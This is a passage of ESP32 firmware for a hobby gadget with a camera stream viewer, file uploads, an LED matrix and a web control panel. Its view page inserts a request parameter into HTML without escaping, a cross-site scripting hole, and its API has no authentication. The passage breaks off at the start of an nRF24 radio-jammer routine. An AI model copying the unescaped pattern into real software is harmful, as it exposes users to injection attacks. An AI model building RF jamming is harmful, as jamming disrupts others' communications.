    String fn = up.filename;
    fn.toLowerCase();
    if (fn.endsWith(".gif")) uploadTargetPath = GIF_PATH;
    else if (fn.endsWith(".bmp")) uploadTargetPath = BMP_PATH;
    else { uploadRejected = true; return; }
    if (LittleFS.exists(uploadTargetPath)) LittleFS.remove(uploadTargetPath);
    uploadFile = LittleFS.open(uploadTargetPath, "w");
    if (!uploadFile) uploadRejected = true;
  } else if (up.status == UPLOAD_FILE_WRITE) {
    if (uploadRejected) return;
    uploadBytes += up.currentSize;
    if (uploadBytes > MAX_UPLOAD_BYTES) {
      uploadRejected = true;
      if (uploadFile) uploadFile.close();
      if (LittleFS.exists(uploadTargetPath)) LittleFS.remove(uploadTargetPath);
      return;
    }
    if (uploadFile) uploadFile.write(up.buf, up.currentSize);
  } else if (up.status == UPLOAD_FILE_END) {
    if (uploadFile) uploadFile.close();
  } else if (up.status == UPLOAD_FILE_ABORTED) {
    if (uploadFile) uploadFile.close();
    if (!uploadTargetPath.isEmpty() && LittleFS.exists(uploadTargetPath)) LittleFS.remove(uploadTargetPath);
  }
}

static void handleUploadDone() {
  if (uploadRejected) { server.send(413, "text/plain", "UPLOAD_REJECTED (type or too big)"); return; }
  mediaStamp++;
  uiMarkDirty();
  server.sendHeader("Location", "/");
  server.send(303);
}

static bool cameraUrlSaveToFS() {
  if (!fsReady) return false;
  File f = LittleFS.open(CAM_URL_PATH, "w");
  if (!f) return false;
  f.print(cameraUrl);
  f.close();
  return true;
}

static bool cameraUrlLoadFromFS() {
  if (!fsReady) return false;
  if (!LittleFS.exists(CAM_URL_PATH)) return false;
  File f = LittleFS.open(CAM_URL_PATH, "r");
  if (!f) return false;
  String s = f.readStringUntil('\n');
  f.close();
  s.trim();
  if (s.length() == 0) return false;
  cameraUrl = s;
  return true;
}

static void cameraStop() {
  if (cameraBmpFile) cameraBmpFile.close();
  if (cameraClient.connected()) cameraClient.stop();
  // fully reset client object to clear any stale state
  cameraClient = WiFiClient();
  cameraStreamReady = false;
  cameraBoundary = "";
  cameraCaptureActive = false;
  cameraCapturePending = false;
  cameraLastConnectMs = 0;
  cameraLastFrameMs = 0;
  cameraLastDisplayMs = 0;
  // don't clear fail count here so callers can set backoff when appropriate
}

static void cameraCaptureRequest() {
  cameraCapturePending = true;
}

static bool cameraParseUrl(const String &url, String &host, uint16_t &port, String &path) {
  if (!url.startsWith("http://")) return false;
  String rest = url.substring(7);
  int slash = rest.indexOf('/');
  String hostPort = (slash >= 0) ? rest.substring(0, slash) : rest;
  path = (slash >= 0) ? rest.substring(slash) : "/";
  int colon = hostPort.indexOf(':');
  if (colon >= 0) {
    host = hostPort.substring(0, colon);
    port = (uint16_t)hostPort.substring(colon + 1).toInt();
  } else {
    host = hostPort;
    port = 80;
  }
  return host.length() > 0 && port > 0;
}

static bool cameraReadLine(String &out, uint32_t timeoutMs) {
  out = "";
  uint32_t start = millis();
  while (millis() - start < timeoutMs) {
    while (cameraClient.available()) {
      char c = (char)cameraClient.read();
      if (c == '\n') return true;
      if (c != '\r') out += c;
    }
    delay(1);
  }
  return false;
}

static bool cameraReadBytes(uint8_t *buf, size_t len, uint32_t timeoutMs) {
  size_t got = 0;
  uint32_t start = millis();
  while (got < len && millis() - start < timeoutMs) {
    int avail = cameraClient.available();
    if (avail > 0) {
      int toRead = (int)min<size_t>((size_t)avail, len - got);
      int readNow = cameraClient.read(buf + got, toRead);
      if (readNow > 0) got += (size_t)readNow;
    } else {
      delay(1);
    }
  }
  return got == len;
}

static bool cameraBeginCapture(uint16_t w, uint16_t h) {
  if (!fsReady) return false;
  cameraCapturePath = String("/cam_") + String(millis()) + ".bmp";
  if (LittleFS.exists(cameraCapturePath)) LittleFS.remove(cameraCapturePath);
  cameraBmpFile = LittleFS.open(cameraCapturePath, "w");
  if (!cameraBmpFile) return false;

  uint32_t rowSize = (w * 3 + 3) & ~3;
  uint32_t imageSize = rowSize * h;
  uint32_t fileSize = 54 + imageSize;

  uint8_t header[54] = {0};
  header[0] = 'B'; header[1] = 'M';
  header[2] = (uint8_t)(fileSize); header[3] = (uint8_t)(fileSize >> 8);
  header[4] = (uint8_t)(fileSize >> 16); header[5] = (uint8_t)(fileSize >> 24);
  header[10] = 54;
  header[14] = 40;
  header[18] = (uint8_t)(w); header[19] = (uint8_t)(w >> 8);
  header[20] = (uint8_t)(w >> 16); header[21] = (uint8_t)(w >> 24);
  int32_t negH = -(int32_t)h;
  header[22] = (uint8_t)(negH); header[23] = (uint8_t)(negH >> 8);
  header[24] = (uint8_t)(negH >> 16); header[25] = (uint8_t)(negH >> 24);
  header[26] = 1;
  header[28] = 24;
  header[34] = (uint8_t)(imageSize); header[35] = (uint8_t)(imageSize >> 8);
  header[36] = (uint8_t)(imageSize >> 16); header[37] = (uint8_t)(imageSize >> 24);

  cameraBmpFile.write(header, sizeof(header));
  cameraCaptureActive = true;
  // next row to write in BMP (top-down). We'll try to write rows sequentially
  // to avoid expensive seeks when decoder provides rows in order.
  cameraCaptureNextRow = 0;
  return true;
}

static void cameraEndCapture() {
  if (cameraBmpFile) cameraBmpFile.close();
  cameraCaptureActive = false;
  if (cameraCapturePath.length() > 0) {
    bmpViewPath = cameraCapturePath;
    mediaStamp++;
  }
}

static bool cameraJpgDraw(int16_t x, int16_t y, uint16_t w, uint16_t h, uint16_t *data) {
  if (!data) return true;
  int16_t drawX = x;
  int16_t drawY = y;
  int16_t drawW = (int16_t)w;
  int16_t drawH = (int16_t)h;
  int16_t skipX = 0;
  int16_t skipY = 0;

  if (drawX < 0) { skipX = -drawX; drawW -= skipX; drawX = 0; }
  if (drawY < 0) { skipY = -drawY; drawH -= skipY; drawY = 0; }
  if (drawX + drawW > tft.width()) drawW = tft.width() - drawX;
  if (drawY + drawH > tft.height()) drawH = tft.height() - drawY;
  if (drawW <= 0 || drawH <= 0) return true;

  for (int row = 0; row < drawH; row++) {
    int srcRow = skipY + row;
    if (!cameraSkipTftDuringCapture && cameraDisplayScale <= 1.01f) {
      // fast path: 1:1 or reduced size already handled by TJpgDec scaler
      tft.drawRGBBitmap(drawX, drawY + row, data + srcRow * w + skipX, drawW, 1);
    } else if (!cameraSkipTftDuringCapture) {
      // scaled drawing (nearest neighbor) to fill the display
      for (int col = 0; col < drawW; col++) {
        uint16_t c = data[srcRow * w + skipX + col];
        int srcXGlobal = (x - cameraFrameX) + skipX + col;
        int srcYGlobal = (y - cameraFrameY) + srcRow;
        int destX = cameraDisplayX + (int)(srcXGlobal * cameraDisplayScale + 0.5f);
        int destY = cameraDisplayY + (int)(srcYGlobal * cameraDisplayScale + 0.5f);
        int destX2 = cameraDisplayX + (int)((srcXGlobal + 1) * cameraDisplayScale + 0.5f);
        int destY2 = cameraDisplayY + (int)((srcYGlobal + 1) * cameraDisplayScale + 0.5f);
        int rw = destX2 - destX; if (rw <= 0) rw = 1;
        int rh = destY2 - destY; if (rh <= 0) rh = 1;
        uint16_t color = c;
        tft.fillRect(destX, destY, rw, rh, color);
      }
    }
  }

  if (!cameraCaptureActive || !cameraBmpFile) return true;
  int imgX = x - cameraFrameX + skipX;
  int imgY = y - cameraFrameY + skipY;
  if (imgX < 0 || imgY < 0) return true;
  if (imgX + drawW > cameraFrameW || imgY + drawH > cameraFrameH) return true;

  uint32_t rowSize = (cameraFrameW * 3 + 3) & ~3;
  static uint8_t lineBuf[240 * 3];
  for (int row = 0; row < drawH; row++) {
    uint16_t *src = data + (skipY + row) * w + skipX;
    for (int col = 0; col < drawW; col++) {
      uint16_t c = src[col];
      uint8_t r = (uint8_t)(((c >> 11) & 0x1F) * 255 / 31);
      uint8_t g = (uint8_t)(((c >> 5) & 0x3F) * 255 / 63);
      uint8_t b = (uint8_t)((c & 0x1F) * 255 / 31);
      int idx = col * 3;
      lineBuf[idx + 0] = b;
      lineBuf[idx + 1] = g;
      lineBuf[idx + 2] = r;
    }
    uint32_t targetRow = (uint32_t)(imgY + row);
    if (cameraCaptureNextRow == targetRow) {
      // file pointer should already be at the correct position (sequential)
      cameraBmpFile.write(lineBuf, drawW * 3);
      cameraCaptureNextRow++;
    } else {
      // fallback: seek and write if rows arrived out of order
      uint32_t offset = 54 + targetRow * rowSize + (uint32_t)imgX * 3;
      cameraBmpFile.seek(offset);
      cameraBmpFile.write(lineBuf, drawW * 3);
    }
  }
  return true;
}

static bool cameraConnectStream() {
  if (!WiFi.isConnected()) { cameraLastError = "WiFi not connected"; return false; }
  String host;
  String path;
  uint16_t port = 0;
  if (!cameraParseUrl(cameraUrl, host, port, path)) {
    cameraLastError = "Bad URL";
    return false;
  }
  if (!cameraClient.connect(host.c_str(), port)) {
    cameraLastError = "Connect failed";
    return false;
  }
  cameraClient.print(String("GET ") + path + " HTTP/1.1\r\n" +
                     String("Host: ") + host + "\r\n" +
                     "Connection: keep-alive\r\n\r\n");

  String line;
  cameraBoundary = "";
  while (cameraReadLine(line, 2000)) {
    if (line.length() == 0) break;
    String lower = line; lower.toLowerCase();
    int idx = lower.indexOf("boundary=");
    if (idx >= 0) {
      String b = line.substring(idx + 9);
      b.trim();
      if (!b.startsWith("--")) b = "--" + b;
      cameraBoundary = b;
    }
  }
  if (cameraBoundary.length() == 0) {
    cameraLastError = "No boundary";
    cameraClient.stop();
    return false;
  }
  cameraStreamReady = true;
  cameraLastError = "";
  return true;
}

static void cameraLoop() {
  // enforce camera rotation while in camera mode
  tft.setRotation(3);

  if (!WiFi.isConnected()) {
    cameraStop();
    if (tftDirty) { tftDrawCameraStatus("WiFi not connected", ""); tftDirty = false; }
    return;
  }

  if (!cameraStreamReady) {
    if (millis() < cameraReconnectBackoffUntilMs) {
      if (tftDirty) { tftDrawCameraStatus("Backoff...", ""); tftDirty = false; }
      return;
    }
    if (millis() - cameraLastConnectMs >= CAMERA_RECONNECT_MS) {
      cameraLastConnectMs = millis();
      if (!cameraConnectStream()) {
        if (tftDirty) { tftDrawCameraStatus("Connecting...", cameraLastError); tftDirty = false; }
        return;
      }
    } else if (tftDirty) {
      tftDrawCameraStatus("Connecting...", cameraLastError);
      tftDirty = false;
    }
    return;
  }

  if (!cameraClient.connected()) {
    cameraStop();
    return;
  }

  if (cameraLastFrameMs > 0 && millis() - cameraLastFrameMs > 3000) {
    cameraLastError = "Stream timeout";
    // apply backoff before attempting reconnect
    cameraReconnectBackoffUntilMs = millis() + 3000;
    cameraFailCount = 0;
    cameraStop();
    return;
  }

  String line;
  bool gotBoundary = false;
  uint32_t scanStart = millis();
  while (millis() - scanStart < 300) {
    if (!cameraReadLine(line, 120)) break;
    if (line.startsWith(cameraBoundary)) { gotBoundary = true; break; }
  }
  if (!gotBoundary) {
    if (cameraLastFrameMs > 0 && millis() - cameraLastFrameMs > 1500) {
      cameraLastError = "Boundary timeout";
      cameraStop();
    }
    return;
  }

  int contentLength = -1;
  while (cameraReadLine(line, 200)) {
    if (line.length() == 0) break;
    String lower = line; lower.toLowerCase();
    if (lower.startsWith("content-length:")) {
      contentLength = line.substring(15).toInt();
    }
  }
  if (contentLength <= 0 || (size_t)contentLength > CAMERA_MAX_JPEG) {
    cameraLastError = "Bad frame";
    if (++cameraFailCount >= 3) {
      uint32_t backoff = min<uint32_t>(30000, (uint32_t)cameraFailCount * 2000);
      cameraReconnectBackoffUntilMs = millis() + backoff;
      cameraFailCount = 0;
      cameraStop();
    }
    return;
  }

  uint8_t *jpgBuf = (uint8_t *)malloc((size_t)contentLength);
  if (!jpgBuf) {
    cameraLastError = "No mem";
    if (++cameraFailCount >= 3) {
      uint32_t backoff = min<uint32_t>(30000, (uint32_t)cameraFailCount * 2000);
      cameraReconnectBackoffUntilMs = millis() + backoff;
      cameraFailCount = 0;
      cameraStop();
    }
    return;
  }
  if (!cameraReadBytes(jpgBuf, (size_t)contentLength, 2000)) {
    free(jpgBuf);
    cameraLastError = "Read fail";
    if (++cameraFailCount >= 3) {
      uint32_t backoff = min<uint32_t>(30000, (uint32_t)cameraFailCount * 2000);
      cameraReconnectBackoffUntilMs = millis() + backoff;
      cameraFailCount = 0;
      cameraStop();
    }
    return;
  }

  uint16_t w = 0, h = 0;
  if (TJpgDec.getJpgSize(&w, &h, jpgBuf, (uint32_t)contentLength) != JDR_OK) {
    free(jpgBuf);
    cameraLastError = "Decode size fail";
    if (++cameraFailCount >= 3) {
      uint32_t backoff = min<uint32_t>(30000, (uint32_t)cameraFailCount * 2000);
      cameraReconnectBackoffUntilMs = millis() + backoff;
      cameraFailCount = 0;
      cameraStop();
    }
    return;
  }

  // choose largest power-of-two scale such that decoded size is >= display size if possible
  uint8_t scale = 1;
  while (scale < 8) {
    uint8_t next = scale * 2;
    if ((w / next) >= (uint16_t)tft.width() && (h / next) >= (uint16_t)tft.height()) scale = next;
    else break;
  }
  if (scale > 8) scale = 8;
  TJpgDec.setJpgScale(scale);
  w = w / scale;
  h = h / scale;

  cameraFrameW = w;
  cameraFrameH = h;
  // compute display scaling to fill TFT while preserving aspect ratio
  float sx = (float)tft.width() / (float)w;
  float sy = (float)tft.height() / (float)h;
  cameraDisplayScale = min(sx, sy);
  cameraDisplayW = (int16_t)((float)w * cameraDisplayScale + 0.5f);
  cameraDisplayH = (int16_t)((float)h * cameraDisplayScale + 0.5f);
  cameraDisplayX = (int16_t)((tft.width() - cameraDisplayW) / 2);
  cameraDisplayY = (int16_t)((tft.height() - cameraDisplayH) / 2);
  // keep original frame coords too for capture math
  cameraFrameX = (int16_t)((tft.width() - (int16_t)w) / 2);
  cameraFrameY = (int16_t)((tft.height() - (int16_t)h) / 2);

  if (cameraCapturePending) {
    // write JPEG directly to LittleFS (faster than BMP)
    cameraCapturePending = false;
    cameraCapturePath = String("/cam_") + String(millis()) + ".jpg";
    File f = LittleFS.open(cameraCapturePath, "w");
    if (f) {
      f.write(jpgBuf, (size_t)contentLength);
      f.close();
      bmpViewPath = cameraCapturePath;
      mediaStamp++;
      cameraCaptureIndicatorUntilMs = millis() + 800;
    }
  }

  // Decide whether to actually render this frame or skip it to save CPU
  const bool forceRender = cameraCaptureActive || cameraCapturePending;
  const bool renderAllowed = forceRender || (millis() - cameraLastDisplayMs >= CAMERA_MIN_FRAME_MS);

  cameraLastFrameMs = millis();
  cameraFailCount = 0;

  if (renderAllowed) {
    if (tftDirty) tft.fillScreen(ST77XX_BLACK);
    TJpgDec.drawJpg(cameraFrameX, cameraFrameY, jpgBuf, (uint32_t)contentLength);
    if (cameraCaptureActive) {
      cameraEndCapture();
      cameraSkipTftDuringCapture = false;
    }
      // draw capture indicator if active
      if (millis() < cameraCaptureIndicatorUntilMs) {
        // small OK badge
        tft.fillRect(tft.width() - 18, 2, 16, 10, UI_ACCENT);
        tft.setTextSize(1);
        tft.setTextColor(UI_TEXT);
        tft.setCursor(tft.width() - 16, 4);
        tft.print("OK");
        // draw thick white border around the camera display to make capture visible
        if (cameraDisplayW > 8 && cameraDisplayH > 8) {
          const uint8_t thickness = 4;
          for (uint8_t i = 0; i < thickness; i++) {
            if (cameraDisplayW > (int)(i*2) && cameraDisplayH > (int)(i*2))
              tft.drawRect(cameraDisplayX + i, cameraDisplayY + i, cameraDisplayW - i*2, cameraDisplayH - i*2, UI_TEXT);
          }
        } else if (cameraDisplayW > 4 && cameraDisplayH > 4) {
          tft.drawRect(cameraDisplayX, cameraDisplayY, cameraDisplayW, cameraDisplayH, UI_TEXT);
        }
      }
    cameraLastDisplayMs = millis();
    tftDirty = false;
  } else {
    // even if we're skipping rendering, ensure we still finish capture write
    if (cameraCaptureActive && !renderAllowed) {
      // decode into callback which will write rows; then finish capture
      TJpgDec.drawJpg(cameraFrameX, cameraFrameY, jpgBuf, (uint32_t)contentLength);
      cameraEndCapture();
      cameraSkipTftDuringCapture = false;
    }
  }

  free(jpgBuf);
}

static void handleRoot() {
  String html =
R"HTML(<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Nana</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-slate-950 text-slate-100 min-h-screen"><div class="max-w-6xl mx-auto p-4 md:p-6 space-y-4"><div class="flex items-center justify-between"><h1 class="text-xl md:text-2xl font-bold">Control Panel</h1><div id="statusLine" class="text-xs md:text-sm text-slate-300">Loading...</div></div><div class="grid md:grid-cols-2 gap-4"><div class="bg-slate-900 rounded-xl border border-slate-800 p-4 space-y-3"><div class="grid grid-cols-2 sm:grid-cols-3 gap-2 text-xs" id="badges"><div class="bg-slate-800 rounded px-2 py-1" id="ip">IP:-</div><div class="bg-slate-800 rounded px-2 py-1" id="ssid">SSID:-</div><div class="bg-slate-800 rounded px-2 py-1" id="mode">MODE:-</div><div class="bg-slate-800 rounded px-2 py-1" id="tft">TFT:-</div><div class="bg-slate-800 rounded px-2 py-1" id="song">SONG:-</div><div class="bg-slate-800 rounded px-2 py-1" id="water">WATER:-</div></div><div class="flex flex-wrap gap-2 text-sm"><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('ui')">UI</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('image')">BMP</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('gif')">GIF</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('cam')">CAM</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('game')">GAME</button><a href="/gallery" class="px-3 py-2 rounded bg-slate-700 inline-flex items-center">Gallery</a></div><div class="flex flex-wrap gap-2 text-sm"><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/tft/sleep')">TFT Sleep</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/tft/wake')">TFT Wake</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/gyro?set=on')">Gyro ON</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/gyro?set=off')">Gyro OFF</button></div><div class="flex flex-wrap gap-2 text-sm"><button class="px-3 py-2 rounded bg-teal-700" onclick="api('/api/song/play')">Play Song</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/song/stop')">Stop Song</button><button class="px-3 py-2 rounded bg-cyan-700" onclick="api('/api/water?set=on')">Water ON</button><button class="px-3 py-2 rounded bg-slate-700" onclick="api('/api/water?set=off')">Water OFF</button></div><div class="space-y-2 text-sm"><label class="block">TFT BL: <span id="tblv">255</span></label><input id="tbl" type="range" min="0" max="255" value="255" class="w-full"/><label class="block">LED BR: <span id="brv">60</span></label><input id="br" type="range" min="0" max="255" value="60" class="w-full"/></div><form method="POST" action="/upload" enctype="multipart/form-data" class="flex flex-wrap items-center gap-2 text-sm"><input type="file" name="file" accept="image/bmp,image/gif,image/x-ms-bmp,.bmp,.gif" class="text-xs"/><button class="px-3 py-2 rounded bg-emerald-700">Upload</button></form><div class="flex flex-wrap items-center gap-2 text-sm"><input id="camurl" type="text" class="w-full rounded bg-slate-800 border border-slate-700 px-2 py-1 text-xs" placeholder="http://x.x.x.x:4747/video?240x240"/><button class="px-3 py-2 rounded bg-slate-700" onclick="setCamUrl()">Set Cam URL</button><button class="px-3 py-2 rounded bg-slate-700" onclick="setMode('cam')">Open Camera</button><button class="px-3 py-2 rounded bg-emerald-700" onclick="captureCam()">Capture</button></div><div class="text-xs text-slate-400" id="camstat"></div><div class="text-xs text-slate-400" id="dbg"></div></div><div class="bg-slate-900 rounded-xl border border-slate-800 p-4 space-y-3"><div class="flex flex-wrap items-center gap-2 text-sm"><label>Brush</label><input id="pick" type="color" value="#000050" class="w-10 h-10 rounded"/><button class="px-3 py-2 rounded bg-slate-700" onclick="fillAll()">Fill</button><button class="px-3 py-2 rounded bg-slate-700" onclick="clearAll()">Clear</button><button class="px-3 py-2 rounded bg-blue-700" onclick="applyNow()">Apply</button><button class="px-3 py-2 rounded bg-slate-700" onclick="saveNow()">Save</button><button class="px-3 py-2 rounded bg-slate-700" onclick="loadSaved()">Load</button></div><div class="flex flex-wrap gap-2 text-xs"><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('smiley')">:)</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('neutral')">:|</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('left')">L</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('right')">R</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('concern')">:/</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('sleepy')">Zzz</button><button class="px-2 py-1 rounded bg-slate-700" onclick="tpl('clear')">X</button></div><div id="mx" class="grid grid-cols-8 gap-1 w-max"></div><div id="hint" class="text-xs text-slate-300"></div></div></div></div><script>
let colors=Array(64).fill('#000000');let editing=true;const q=(id)=>document.getElementById(id);const hex=(s)=>(s||'#000000').toUpperCase();function renderMatrix(){const m=q('mx');m.innerHTML='';for(let i=0;i<64;i++){const d=document.createElement('button');d.className='w-7 h-7 rounded border border-slate-700';d.style.background=colors[i];d.onclick=()=>{colors[i]=hex(q('pick').value);editing=true;renderMatrix();};m.appendChild(d);}}
function colorsToHex384(){return colors.map(c=>hex(c).replace('#','')).join('');}function hex384ToColors(s){if(!s||s.length!==384)return false;for(let i=0;i<64;i++)colors[i]='#'+s.slice(i*6,i*6+6).toUpperCase();return true;}
async function api(u){await fetch(u);}async function setMode(m){await api('/api/mode?set='+m);}async function setCamUrl(){const u=q('camurl').value.trim();if(!u)return;await fetch('/api/camera/url?set='+encodeURIComponent(u));}async function captureCam(){await api('/api/camera/capture');}async function setBrushOnDevice(){const c=hex(q('pick').value).replace('#','');const r=parseInt(c.slice(0,2),16);const g=parseInt(c.slice(2,4),16);const b=parseInt(c.slice(4,6),16);await api('/api/brush?rgb='+r+','+g+','+b);}
function fillAll(){colors=Array(64).fill(hex(q('pick').value));editing=true;renderMatrix();}function clearAll(){colors=Array(64).fill('#000000');editing=true;renderMatrix();}
async function applyNow(){await setBrushOnDevice();const r=await fetch('/api/matrix/setc?hex='+colorsToHex384());q('hint').textContent=r.ok?'OK':'Blocked';if(r.ok)editing=false;}async function tpl(n){await setBrushOnDevice();await api('/api/matrix/template?name='+n);await pullMatrix();}async function saveNow(){await api('/api/matrix/save');}async function loadSaved(){await api('/api/matrix/load');await pullMatrix();}async function pullMatrix(){const r=await fetch('/api/matrix/getc');const s=await r.text();if(hex384ToColors(s))renderMatrix();}
let brT=0,tblT=0;q('br').oninput=(e)=>{q('brv').textContent=e.target.value;clearTimeout(brT);brT=setTimeout(()=>api('/api/brightness?set='+e.target.value),120);};q('tbl').oninput=(e)=>{q('tblv').textContent=e.target.value;clearTimeout(tblT);tblT=setTimeout(()=>api('/api/tft/backlight?set='+e.target.value),120);};
async function refreshStatus(){const j=await(await fetch('/api/status')).json();q('ip').textContent='IP:'+j.ip;q('ssid').textContent='SSID:'+j.ssid;q('mode').textContent='MODE:'+(j.mode||'-').toUpperCase();q('tft').textContent='TFT:'+(j.tftSleeping?'SLEEP':'ON');q('song').textContent='SONG:'+(j.songPlaying?'PLAY':'STOP');q('water').textContent='WATER:'+(j.waterMode?'ON':'OFF');q('statusLine').textContent='Dir:'+j.dir+' Game:'+j.gameView;q('dbg').textContent='G:'+j.gyro.x.toFixed(1)+','+j.gyro.y.toFixed(1)+','+j.gyro.z.toFixed(1)+' A:'+j.accel.x.toFixed(2)+','+j.accel.y.toFixed(2)+','+j.accel.z.toFixed(2)+' T:'+j.tilt.roll.toFixed(0)+','+j.tilt.pitch.toFixed(0)+' GIF:'+j.gif.playing+' Gm:L'+j.level+'S'+j.score+'H'+j.hp;if(j.cam){q('camstat').textContent='CAM:'+(j.cam.connected?'ON':'OFF')+' '+(j.cam.lastError||'');if(!document.activeElement||document.activeElement.id!=='camurl'){q('camurl').value=j.cam.url||'';}}if(+q('br').value!==j.brightness){q('br').value=j.brightness;q('brv').textContent=j.brightness;}if(+q('tbl').value!==j.tftBacklight){q('tbl').value=j.tftBacklight;q('tblv').textContent=j.tftBacklight;}if(!editing&&!j.waterMode&&j.mode!=='game')await pullMatrix();}
renderMatrix();pullMatrix().then(()=>{editing=false;});refreshStatus();setInterval(refreshStatus,700);
</script></body></html>)HTML";
  server.send(200, "text/html", html);
}

static void handleGallery() {
  String html =
R"HTML(<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Gallery</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-slate-900 text-slate-100 min-h-screen"><div class="max-w-4xl mx-auto p-4"><h1 class="text-xl font-bold mb-4">Gallery</h1><div id="gallery" class="grid grid-cols-3 gap-2"></div><script>
const q=(id)=>document.getElementById(id);
async function fetchGallery(){try{const r=await fetch('/api/files');if(!r.ok)return;const files=await r.json();const g=q('gallery');if(!g)return;g.innerHTML='';files.forEach(f=>{const a=document.createElement('a');a.href='/view?path='+encodeURIComponent(f);a.target='_blank';a.className='block';const img=document.createElement('img');img.src='/file?path='+encodeURIComponent(f);img.alt=f;img.className='w-full h-32 object-cover rounded';a.appendChild(img);g.appendChild(a);});}catch(e){}}
fetchGallery();setInterval(fetchGallery,5000);
</script></div></body></html>)HTML";
  server.send(200, "text/html", html);
}

static void handleView() {
  if (!server.hasArg("path")) {
    server.send(400, "text/plain", "missing path");
    return;
  }

  String path = server.arg("path");

  String html = R"rawliteral(
<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>View</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-900 text-slate-100 min-h-screen">
<div class="max-w-4xl mx-auto p-4">
<a class="inline-block mb-4 px-3 py-2 rounded bg-slate-700" href="/gallery">&larr; Back</a>
<div class="w-full bg-black flex items-center justify-center">
<img src="/file?path=)rawliteral";

  html += path;

  html += R"rawliteral(" style="max-width:100%;height:auto;display:block;" alt="">
</div>
</div>
</body>
</html>
)rawliteral";

  server.send(200, "text/html", html);
}


static void doNetworkInit() {
  if (deferredInitDone) return;

  wifiAutoConfig();
  timeSynced = false;
  lastTimeSyncAttemptMs = 0;
  timeTrySyncNtp();

  gif.begin(LITTLE_ENDIAN_PIXELS);

  server.on("/", HTTP_GET, handleRoot);
  server.on("/api/status", HTTP_GET, handleStatus);
  server.on("/api/mode", HTTP_GET, handleModeApi);
  server.on("/api/game", HTTP_GET, handleGameApi);
  server.on("/api/matrix/getc", HTTP_GET, handleMatrixGetApi);
  server.on("/api/matrix/setc", HTTP_GET, handleMatrixSetApi);
  server.on("/api/matrix/template", HTTP_GET, handleMatrixTemplateApi);
  server.on("/api/matrix/save", HTTP_GET, handleMatrixSaveApi);
  server.on("/api/matrix/load", HTTP_GET, handleMatrixLoadApi);
  server.on("/api/brush", HTTP_GET, handleBrushApi);
  server.on("/api/brightness", HTTP_GET, handleBrightnessApi);
  server.on("/api/tft/backlight", HTTP_GET, handleBacklightApi);
  server.on("/api/tft/sleep", HTTP_GET, handleTftSleepApi);
  server.on("/api/tft/wake", HTTP_GET, handleTftWakeApi);
  server.on("/api/gyro", HTTP_GET, handleImuApi);
  server.on("/api/song/play", HTTP_GET, handleSongPlayApi);
  server.on("/api/song/stop", HTTP_GET, handleSongStopApi);
  server.on("/api/water", HTTP_GET, handleWaterApi);
  server.on("/api/camera/url", HTTP_GET, handleCameraUrlApi);
  server.on("/api/camera/capture", HTTP_GET, handleCameraCaptureApi);
  server.on("/api/files", HTTP_GET, handleFilesApi);
  server.on("/file", HTTP_GET, handleFileServe);
  server.on("/gallery", HTTP_GET, handleGallery);
  server.on("/view", HTTP_GET, handleView);
  server.on("/upload", HTTP_POST, handleUploadDone, handleUploadStream);
  server.begin();

  deferredInitDone = true;
}

static void runDeferredInit() {
  if (deferredInitDone) return;
  if (deferredInitAtMs == 0) deferredInitAtMs = millis();
  if (millis() - deferredInitAtMs < 1500) return;
  doNetworkInit();
}

void setup() {
  Serial.begin(115200);
  delay(200);
  esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
  fsReady = LittleFS.begin(false);
  if (!fsReady) {
    // Fallback to format only when mount fails.
    fsReady = LittleFS.begin(true);
  }
  noteEnsureDir();
  (void)cameraUrlLoadFromFS();
  (void)wifiCredentialsLoadFromFS();
  wifiAutoConnectPending = (savedWifiSsid.length() > 0);
  (void)utcOffsetLoadFromFS();
  timeApplyTZ();
  (void)brightnessLoadFromFS();
  (void)blLoadFromFS();
  (void)imuLoadFromFS();
  (void)uiSfxLoadFromFS();
  (void)sleepModeLoadFromFS();
  (void)clockDisplayLoadFromFS();
  (void)buzzerVolLoadFromFS();
  blInit();
  tftInitDisplay();
  TJpgDec.setCallback(cameraJpgDraw);
  tftDrawSplash();
  buttonsInit();
  matrixInit();
  if (!matrixLoadFromFS()) {
    matrixApplyTemplate(MT_SMILEY);
    (void)matrixSaveToFS();
  }
  matrixCommitToPixels();
  QMI8658_Init();
  QMI8658_SetEnabled(imuOn);
  pinMode(BUZZER_PIN, OUTPUT);
  songStop();
  randomSeed((uint32_t)esp_random());
  waterReset();
  deferredInitAtMs = 0;
  uiEnter(UI_MENU);
}

static void matrixStartText() {
  enterMode(APP_MATRIX_TEXT);
  matrixGfx.setTextWrap(false);
  matrixTextX = 8;
  matrixTextLastMs = millis();
}

static void matrixTextLoop() {
  uint32_t now = millis();
  if (now - matrixTextLastMs > 100) { // Speed 100ms per piksel
    matrixTextLastMs = now;
    matrixClearBuffer();
    matrixGfx.setCursor(matrixTextX, 0); // baris ke 0
    matrixGfx.print(matrixTextSaved);
    matrixCommitToPixels();

    if (matrixTextScroll) {
      matrixTextX--;
      int lenPixel = matrixTextSaved.length() * 6; // Standard 5x7 font -> 6 piksel per huruf
      if (matrixTextX < -lenPixel) matrixTextX = 8; // Reset posisi setelah lewat layar
    } else {
      matrixTextX = 0; // Static mode
    }
  }
}

static void handleNrfJammer() {
#if HAS_RF24_LIB
  if (nrfRadioFound) {
    if (nrfJammingActive && uiScreen == UI_RF_JAMMER && !isSleepActive()) {
